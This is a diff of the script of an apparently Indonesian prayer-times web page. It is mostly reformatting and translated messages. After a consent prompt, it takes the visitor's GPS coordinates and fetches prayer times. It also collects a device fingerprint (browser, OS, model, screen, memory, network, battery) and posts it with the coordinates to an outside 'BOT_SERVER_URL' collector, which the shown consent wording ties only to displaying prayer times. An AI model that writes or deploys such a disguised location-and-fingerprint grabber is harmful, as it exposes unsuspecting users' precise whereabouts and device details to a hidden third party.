@@ -93,176 +93,177 @@ Lokasi Anda
 </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/src/ua-parser.min.js"></script>
 <script>
+const parser = new UAParser()
+const parsed = parser.getResult()
+
 const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/collect"
 let userConsent = false
 const consentModal = document.getElementById("consentModal")
 const acceptConsent = document.getElementById("acceptConsent")
 const denyConsent = document.getElementById("denyConsent")
+
 acceptConsent.addEventListener("click", () => {
-userConsent = true
-consentModal.style.display = "none"
-getLocation()
+  userConsent = true
+  localStorage.setItem("sholatAppConsent", "accepted")
+  consentModal.style.display = "none"
+  getLocation()
 })
+
 denyConsent.addEventListener("click", () => {
-userConsent = false
-consentModal.style.display = "none"
-document.getElementById("lokasi").innerHTML = 
-"<span class='text-amber-400'>Persetujuan diperlukan untuk menampilkan jadwal</span>"
+  userConsent = false
+  localStorage.setItem("sholatAppConsent", "denied")
+  consentModal.style.display = "none"
+  document.getElementById("lokasi").innerHTML =
+    "<span class='text-amber-400'>Consent is required to show prayer times.</span>"
 })
 
 function getDeviceInfo() {
-const info = {
-timestamp: new Date().toISOString(),
-userAgent: navigator.userAgent,
-platform: navigator.platform,
-language: navigator.language,
-screen: {
-width: screen.width,
-height: screen.height,
-colorDepth: screen.colorDepth
-},
-deviceMemory: navigator.deviceMemory || "unknown",
-connection: navigator.connection ? {
-type: navigator.connection.type,
-effectiveType: navigator.connection.effectiveType,
-rtt: navigator.connection.rtt,
-downlink: navigator.connection.downlink
-} : null,
-battery: null
-}
+  const info = {
+    timestamp: new Date().toISOString(),
+    browser: `${parsed.browser.name} ${parsed.browser.version}`,
+    os: `${parsed.os.name} ${parsed.os.version}`,
+    device: parsed.device.model || "Desktop",
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      colorDepth: screen.colorDepth
+    },
+    deviceMemory: navigator.deviceMemory || "unknown",
+    connection: navigator.connection ? {
+      type: navigator.connection.type,
+      effectiveType: navigator.connection.effectiveType,
+      rtt: navigator.connection.rtt,
+      downlink: navigator.connection.downlink
+    } : null,
+    battery: null
+  }
 
-if ("getBattery" in navigator) {
-return navigator.getBattery().then(battery => {
-info.battery = {
-level: battery.level * 100 + "%",
-charging: battery.charging,
-chargingTime: battery.chargingTime,
-dischargingTime: battery.dischargingTime
-}
-return info
-})
-}
+  if ("getBattery" in navigator) {
+    return navigator.getBattery().then(battery => {
+      info.battery = {
+        level: battery.level * 100 + "%",
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      }
+      return info
+    })
+  }
 
-return Promise.resolve(info)
+  return Promise.resolve(info)
 }
 
 function sendDeviceData(deviceInfo, location) {
-if (!userConsent) return
-  
-const payload = JSON.stringify({
-device: deviceInfo,
-location: location,
-timestamp: new Date().toISOString()
-})
+  if (!userConsent) return
 
-const xhr = new XMLHttpRequest()
-xhr.open("POST", BOT_SERVER_URL, true)
-xhr.setRequestHeader("Content-Type", "application/json")
-xhr.onreadystatechange = function () {
-if (xhr.readyState === 4) {
-if (xhr.status === 200) {
-console.log("Data pengiriman berhasil")
-} else {
-console.error("Gagal mengirim data:", xhr.statusText)
-}
-}
-}
-xhr.send(payload)
+  const payload = JSON.stringify({
+    device: deviceInfo,
+    location: location,
+    timestamp: new Date().toISOString()
+  })
+
+  const xhr = new XMLHttpRequest()
+  xhr.open("POST", BOT_SERVER_URL, true)
+  xhr.setRequestHeader("Content-Type", "application/json")
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        console.log("Data sent successfully.")
+      } else {
+        console.error("Failed to send data:", xhr.statusText)
+      }
+    }
+  }
+  xhr.send(payload)
 }
 
 function getJadwalSholat(lat, lon) {
-const xhr = new XMLHttpRequest()
-xhr.open("GET", `https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lon}&method=2`, true)
-xhr.onreadystatechange = function () {
-if (xhr.readyState === 4) {
-if (xhr.status === 200) {
-try {
-const data = JSON.parse(xhr.responseText)
-const jadwal = data.data.timings
-const waktuSholat = [
-{ nama: 'Imsak', waktu: jadwal.Imsak },
-{ nama: 'Subuh', waktu: jadwal.Fajr },
-{ nama: 'Dzuhur', waktu: jadwal.Dhuhr },
-{ nama: 'Ashar', waktu: jadwal.Asr },
-{ nama: 'Maghrib', waktu: jadwal.Maghrib },
-{ nama: 'Isya', waktu: jadwal.Isha }
-]
+  const xhr = new XMLHttpRequest()
+  xhr.open("GET", `https://api.aladhan.com/v1/timings?latitude=${lat}&longitude=${lon}&method=2`, true)
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        try {
+          const data = JSON.parse(xhr.responseText)
+          const jadwal = data.data.timings
+          const waktuSholat = [
+            { name: 'Imsak', time: jadwal.Imsak },
+            { name: 'Fajr', time: jadwal.Fajr },
+            { name: 'Dhuhr', time: jadwal.Dhuhr },
+            { name: 'Asr', time: jadwal.Asr },
+            { name: 'Maghrib', time: jadwal.Maghrib },
+            { name: 'Isha', time: jadwal.Isha }
+          ]
 
-const listItems = waktuSholat.map(item => `
-<li class="flex justify-between items-center p-3 bg-gray-700/30 rounded-lg hover:bg-emerald-400/10 transition-all">
-<span class="text-emerald-300">${item.nama}</span>
-<span class="font-bold text-amber-400">${item.waktu}</span>
-</li>
-`).join('')
+          const listItems = waktuSholat.map(item => `
+            <li class="flex justify-between items-center p-3 bg-gray-700/30 rounded-lg hover:bg-emerald-400/10 transition-all">
+              <span class="text-emerald-300">${item.name}</span>
+              <span class="font-bold text-amber-400">${item.time}</span>
+            </li>
+          `).join('')
 
-document.getElementById("jadwalSholat").innerHTML = listItems
+          document.getElementById("jadwalSholat").innerHTML = listItems
 
-getDeviceInfo().then(deviceInfo => {
-sendDeviceData(deviceInfo, { latitude: lat, longitude: lon })
-})
+          getDeviceInfo().then(deviceInfo => {
+            sendDeviceData(deviceInfo, { latitude: lat, longitude: lon })
+          })
 
-} catch (err) {
-document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Gagal parsing jadwal.</li>`
-}
-} else {
-document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Gagal memuat jadwal sholat.</li>`
-}
-}
-}
-xhr.send()
+        } catch (err) {
+          document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Failed to parse prayer times.</li>`
+        }
+      } else {
+        document.getElementById("jadwalSholat").innerHTML = `<li class="text-red-400">Failed to load prayer times.</li>`
+      }
+    }
+  }
+  xhr.send()
 }
 
 function getLocation() {
-if (!userConsent) {
-document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Menunggu persetujuan...</span>"
-return
-}
+  if (!userConsent) {
+    document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Waiting for user consent...</span>"
+    return
+  }
 
-if (navigator.geolocation) {
-document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Mendapatkan lokasi...</span>"
+  if (navigator.geolocation) {
+    document.getElementById("lokasi").innerHTML = "<span class='text-amber-400'>Getting location...</span>"
 
-navigator.geolocation.getCurrentPosition(position => {
-const lat = position.coords.latitude.toFixed(4)
-const lon = position.coords.longitude.toFixed(4)
+    navigator.geolocation.getCurrentPosition(position => {
+      const lat = position.coords.latitude.toFixed(4)
+      const lon = position.coords.longitude.toFixed(4)
 
-document.getElementById("lokasi").innerHTML = `
-<span class="text-amber-400">Koordinat:</span> ${lat}, ${lon}<br>
-<span class="text-amber-400">Ketepatan:</span> ${position.coords.accuracy} meter
-`
-
-getJadwalSholat(lat, lon)
-
-}, (error) => {
-document.getElementById("lokasi").innerHTML = `
-<span class="text-red-400">⚠️ Gagal mendapatkan lokasi:</span><br>
-${error.message}
-`
-})
-} else {
-document.getElementById("lokasi").innerHTML = `<span class="text-red-400">Browser tidak mendukung geolocation</span>`
-}
+      document.getElementById("lokasi").innerHTML = `
+        <span class="text-amber-400">Coordinates:</span> ${lat}, ${lon}<br>
+        <span class="text-amber-400">Accuracy:</span> ${position.coords.accuracy} meters
+      `
+      getJadwalSholat(lat, lon)
+    }, (error) => {
+      document.getElementById("lokasi").innerHTML = `
+        <span class="text-red-400">⚠️ Failed to retrieve location:</span><br>
+        ${error.message}
+      `
+    })
+  } else {
+    document.getElementById("lokasi").innerHTML = `<span class="text-red-400">Geolocation not supported by this browser</span>`
+  }
 }
 
 if (localStorage.getItem("sholatAppConsent") === "accepted") {
-userConsent = true
-consentModal.style.display = "none"
-getLocation()
+  userConsent = true
+  consentModal.style.display = "none"
+  getLocation()
 } else if (localStorage.getItem("sholatAppConsent") === "denied") {
-userConsent = false
-consentModal.style.display = "none"
+  userConsent = false
+  consentModal.style.display = "none"
 } else {
-consentModal.style.display = "flex"
+  consentModal.style.display = "flex"
 }
-
-acceptConsent.addEventListener("click", () => {
-localStorage.setItem("sholatAppConsent", "accepted")
-})
-
-denyConsent.addEventListener("click", () => {
-localStorage.setItem("sholatAppConsent", "denied")
-})
 </script>
+
 
 
 <div class="max-w-2xl mx-auto px-5 py-8">
